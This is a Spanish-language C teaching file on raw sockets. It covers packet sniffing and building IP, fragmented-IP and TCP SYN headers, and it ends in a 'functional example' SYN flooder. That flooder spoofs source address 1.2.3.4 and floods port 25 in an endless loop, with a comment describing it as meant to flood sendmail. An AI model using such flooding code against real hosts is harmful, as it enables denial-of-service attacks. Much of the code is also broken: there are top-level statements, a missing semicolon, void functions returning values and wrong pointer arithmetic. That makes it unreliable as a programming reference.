/*

Protocolos de Internet- Javier Ouret 

RAW SOCKETS 

*/

#include<stdio.h>
#include<malloc.h>
#include<string.h>
#include<signal.h>
#include<stdbool.h>
#include<socket.h>
#include<types.h>

#include<linux/if_packet.h>
#include<netinet/in.h>		 
// Encabezado de Ethernet
#include<netinet/if_ether.h>
// Encabezado de IP
#include<netinet/ip.h>		
// Encabezado de UDP
#include<netinet/udp.h>	
// Encabezado de TCP	
#include<netinet/tcp.h>
// Compatibilidad con inet_ntoa
#include<arpa/inet.h>          

int fd = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
// Los paquetes unitarios no suelen ser más grandes que 8192 bytes
char buffer[8192]; 
while (read (fd, buffer, 8192) > 0)
 printf ("Paquete TCP: %s\n", 
  buffer+sizeof(struct iphdr)+sizeof(struct tcphdr));

// Función para construir un encabezado (header) IP

void buildip_nf()
{
        struct iphdr *ip;
        
        // reservo memoria dinámica
        ip = (struct iphdr *) malloc(sizeof(struct iphdr));
        // Longitud del encabezado en bytes
        ip->ihl = 5; 
        // Versión de IP
        ip->version = 4;
        ip->tos = 0; 
        // Longitud total del paquete
        ip->tot_len = sizeof(struct iphdr) + 452
        // identificación del paquete (sin necesidad para este caso)
        ip->id = htons(getuid());
        // El paquete puede pasar 255 saltos
        ip->ttl = 255;
        // Uso TCP como protocolo de transporte
        ip->protocol = IPPROTO_TCP; 
        // Origen del paquete IP
        ip->saddr = inet_addr("127.0.0.1");
        // Destino del paquete IP
        ip->daddr = inet_addr("127.0.0.1");
        // Chequeo (cheksum)
        ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

}

// Función para construir un encabezado de paquete fragmentado

void buildip_f()
{
        struct iphdr *ipf;
        ipf = (struct iphdr *) malloc(sizeof(struct iphdr));
        
        // Primer Fragmento
        
        // Longitud del ancabezado en palabras de 32 bits
        ipf->ihl = 5; 
        // Versión de IP
        ipf->version = 4; 
        // Tipo de servicio (sin usar)
        ipf->tos = 0;
        // Longitud del primer fragmento
        ipf->tot_len = sizeof(struct iphdr) + 256; 
        // Para identificar los 2 fragmentos
        ipf->id = htons(1); 
        // El paquete puede pasar 255 saltos
        ipf->ttl = 255; 
        // Uso TCP como protocolo de transporte
        ipf->protocol = IPPROTO_TCP;
        // Enviando desde localhost
        ipf->saddr = inet_addr("127.0.0.1");
        // enviando a localhost
        ipf->daddr = inet_addr("127.0.0.1"); 
        // Fragmento 0 y MF
        ipf->frag_off = htons(0x2000); 
        // Chequeo (cheksum)
        ipf->check = in_cksum((unsigned short *)ipf,sizeof(struct iphdr)+256);
                
        //
        // Enviar el primer fragmento desde aquí
        //
        
        // Segundo Fragmento
        
        // Actualizo longitud del datagrama
        ipf->tot_len = sizeof(struct iphdr) + 196; 
        // Desplazamiento del fragmento
        ipf->frag_off = htons(32); 
        // Chequeo (cheksum)
        ipf->check = in_cksum((unsigned short *)ipf,sizeof(struct iphdr)+196);
        
        //
        // Enviar el segundo fragmento desde aquí
        //
        
}


#define TCPHDR sizeof(struct tcphdr)
#define PSEUHDR sizeof(struct iphdr)
#define PSEUDO sizeof(struct pseudohdr)

void build_tcp()
{
		// encabezado TCP
        struct tcphdr *tcp; 
		// pseudo encabezado
        struct pseudohdr *pseudo;

        if ((tcp = (struct tcphdr *) malloc(TCPHDR)) == NULL){
                perror("malloc()");
                return -1;
        }

        if ((pseudo = (struct pseudohdr *) malloc(PSEUDOHDR)) == NULL){
                perror("malloc()");
                return -1;
        }
        
        memset(tcp,'\0',TCPHDR); 
        memset(pseudo,'\0',PSEUDOHDR);
        // IP origen
        pseudo->saddr = inet_addr("127.0.0.1"); 
		// IP destino
        pseudo->daddr = inet_addr("127.0.0.1"); 
        pseudo->useless = 0; 
        pseudo->protocol = IPPROTO_TCP;
        
        //pseudo.length = TCPHDR + data;
        // Como no tenemos datos, la longitud es la del header TCP solamente
        pseudo->length = htons(TCPHDR); 
        
        // Envío desde el puerto 5000
        tcp->source = htons(5000); 
        // Envií a TELNET
        tcp->dest = htons(23); 
        // Número inicial de secuencia
        tcp->seq = htonl(31337); 
        // Tiene importancia s�lo si el flag ACK está activo
        tcp->ack_seq = htonl(0); 
        // Desplazamiento del header TCP en palabras de 32 bits
        tcp->doff = 5;
        // FIN no se activa en handshake
        tcp->fin = 0; 
        // SYN se activa en el primer paso del handshake
        tcp->syn = 1; 
        // RST no se activa en handshake
        tcp->rst = 0; 
        // PSH no se activa en handshake
        tcp->psh = 0;
        // ACK no se activa en handshake
        tcp->ack = 0;
        // URG no se activa en handshake
        tcp->urg = 0;
        
        // Longitud máxima de los prximos segmentos
        tcp->window = htons(4000); 
        // Sirve sólo si el flag URG está presente
        tcp->urg_ptr = htons(0); 
        
        // Calculo el chequeo de TCP para evitar datos corruptos
        tcp->check = in_cksum((unsigned short *)pseudo,TCPHDR+PSEUDOHDR);
        // tcp->check = in_cksum((unsigned short *)&pseudo, PSEUDO+TCPHDR);

}


// Cómo crear un raw socket y cominicarse a su nivel

// Descriptor del socket
int sock, optval; 
// Estructura a usar por sendto()
struct sockaddr_in peer; 

// Creo el socket usando TCP para transporte, permitiendo el acceso con SOCK_RAW
if ((sock = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == -1){
        perror("No se puedo crear socket");
        return -1;
}

// IndicO al socket que estoy trabajando a nivel de IPPROTO_IP
// Indico que voy a incluir el header IP con IP_HDDRINCL
setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&optval,sizeof(int));

// Completo la estructura de sockaddr_in usada por sendto()
// Familia de internet
peer.sin_family = AF_INET;
// Puerto destino Telnet con htons para el ordenamiento de los bytes
peer.sin_port = htons(23);
// Indico dirección de destino para convertirla en binario
peer.sin_addr.s_addr = inet_addr("127.0.0.1");

// Envío paquete 
sendto(sock, packet, strlen(packet),0,(struct sockaddr *)&peer,sizeof(struct sockaddr));


// Ejemplo funcional
// Trabajar un poco y buscar los headers correspondientes para linux

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/udp.h>

// usar encabezado IP BSD
#define __USE_BSD     
// usar encabezado TCP BSD
#define __FAVOR_BSD     

// para inundar el puerto 25 de sendmail 
#define P 25            

// Función para generar chequeos de encabezados (header checksums)
unsigned short csum (unsigned short *buf, int nwords)
{
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

int main (void)
{
  // abro socket en modo  raw
  int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
  
  // buffer para guardar encabezados IP, TCP y datos (payload)
  // se apunta al comienzo de la estructura del encabezado IP, luego la estructura del encabezado 
  // TCP para escribir los valores de los mismos
  char datagram[4096];    
  struct ip *iph = (struct ip *) datagram;
  struct tcphdr *tcph = (struct tcphdr *) datagram + sizeof (struct ip);
  
  // el destino contenido en sockaddr_in es usado para determinar el camino de los datagramas
  // en sendto()
  struct sockaddr_in sin;
                        
  sin.sin_family = AF_INET;
  // orden de los bytes
  sin.sin_port = htons (P);
  sin.sin_addr.s_addr = inet_addr ("127.0.0.1");
  
  // pongo en cero el buffer
  memset (datagram, 0, 4096);

  // se rellenan los valores de 
  iph->ip_hl = 5;
  iph->ip_v = 4;
  iph->ip_tos = 0;
  
  // sin carga de datos
  iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);   
  // no importa el valor a usar aqu�
  iph->ip_id = htonl (54321);   
  iph->ip_off = 0;
  iph->ip_ttl = 255;
  iph->ip_p = 6;
  // pongo en cero antes de computar checksum
  iph->ip_sum = 0;             
  // los SYN pueder ser pinchados a ciegas
  iph->ip_src.s_addr = inet_addr ("1.2.3.4");
  iph->ip_dst.s_addr = sin.sin_addr.s_addr;
  // puerto arbitrario
  tcph->th_sport = htons (1234);
  tcph->th_dport = htons (P);
  // en un paquete SYN la secuencia es aleatoria
  tcph->th_seq = random ();
  // la secuencia ACK es 0 para el primer paquete
  tcph->th_ack = 0;
  tcph->th_x2 = 0;
  // primer y �nico segmento TCP
  tcph->th_off = 0;             
  // solicitud de conexi�n inicial
  tcph->th_flags = TH_SYN;      
  // tama�o m�ximo de ventana permitida
  tcph->th_win = htonl (65535); 
  // si se pone el checksum en cero el stack IP del kernel debe completar el valor correcto 
  // durante la transmisi�n
  tcph->th_sum = 0;
  tcph->th_urp = 0;

  iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);

  // es recomendable hacer una llamada a IP_HDRINCL para asegurarse que el kernel interpreta
  // que el encabezado está incluido en los datos y que no coloque su propio encabezado antes
  // de nuestros datos
   
  {
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
      printf ("Atención: no se pueder setear HDRINCL!\n");
  }

  while (1)
    {
      if (sendto (s,            /* nuestro socket */
                  datagram,     /* buffer que contiene encabezados y datos */
                  iph->ip_len,  /* longitud total del datagrama */
                  0,            /* flags de ruteo */
                  (struct sockaddr *) &sin,     /* socket addr */
                  sizeof (sin)) < 0)            
        printf ("error en el send\n");
      else
        printf (".");
    }

  return 0;
}